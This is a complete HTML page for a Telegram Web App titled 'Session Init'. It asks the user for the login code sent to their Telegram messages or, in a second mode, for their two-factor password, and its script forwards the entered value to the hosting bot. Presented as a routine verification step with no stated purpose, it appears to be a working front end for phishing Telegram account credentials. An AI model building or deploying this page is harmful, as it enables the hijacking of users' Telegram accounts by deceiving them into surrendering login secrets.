<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Session Init</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: var(--tg-theme-bg-color, #fff);
    color: var(--tg-theme-text-color, #000);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 24px;
  }
  .container {
    width: 100%;
    max-width: 360px;
    text-align: center;
  }
  h1 {
    font-size: 18px;
    font-weight: 600;
    margin-bottom: 8px;
  }
  .hint {
    font-size: 14px;
    color: var(--tg-theme-hint-color, #999);
    margin-bottom: 24px;
  }
  input {
    width: 100%;
    padding: 14px 16px;
    font-size: 20px;
    letter-spacing: 4px;
    text-align: center;
    border: 2px solid var(--tg-theme-hint-color, #ccc);
    border-radius: 12px;
    background: var(--tg-theme-secondary-bg-color, #f5f5f5);
    color: var(--tg-theme-text-color, #000);
    outline: none;
    transition: border-color 0.2s;
  }
  input:focus {
    border-color: var(--tg-theme-button-color, #3390ec);
  }
  input[type="password"] {
    letter-spacing: 2px;
  }
  .error {
    color: var(--tg-theme-destructive-text-color, #e53935);
    font-size: 13px;
    margin-top: 8px;
    min-height: 20px;
  }
</style>
</head>
<body>
<div class="container">
  <h1 id="title">Enter verification code</h1>
  <p class="hint" id="hint">Check your Telegram messages for the code</p>
  <input id="input" type="text" inputmode="numeric" pattern="[0-9]*"
         autocomplete="one-time-code" maxlength="6" placeholder="12345" autofocus>
  <p class="error" id="error"></p>
</div>
<script>
(function() {
  var params = new URLSearchParams(window.location.search);
  var mode = params.get('mode') || 'otp';
  var input = document.getElementById('input');
  var title = document.getElementById('title');
  var hint = document.getElementById('hint');
  var error = document.getElementById('error');
  var tg = window.Telegram && window.Telegram.WebApp;

  if (mode === '2fa') {
    title.textContent = 'Enter your 2FA password';
    hint.textContent = 'Two-factor authentication is enabled on this account';
    input.type = 'password';
    input.inputMode = 'text';
    input.pattern = '';
    input.maxLength = 128;
    input.placeholder = 'Password';
    input.style.letterSpacing = '2px';
  }

  if (tg) {
    tg.ready();
    tg.expand();
    tg.MainButton.setText('Submit');
    tg.MainButton.show();
    tg.MainButton.onClick(submit);
  }

  input.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') submit();
  });

  function submit() {
    var value = input.value.trim();
    if (!value) {
      error.textContent = mode === 'otp' ? 'Please enter the code' : 'Please enter your password';
      return;
    }
    if (mode === 'otp' && !/^\d{1,6}$/.test(value)) {
      error.textContent = 'Code must be 1-6 digits';
      return;
    }
    error.textContent = '';
    if (tg) {
      tg.sendData(JSON.stringify({ mode: mode, value: value }));
    }
  }
})();
</script>
</body>
</html>
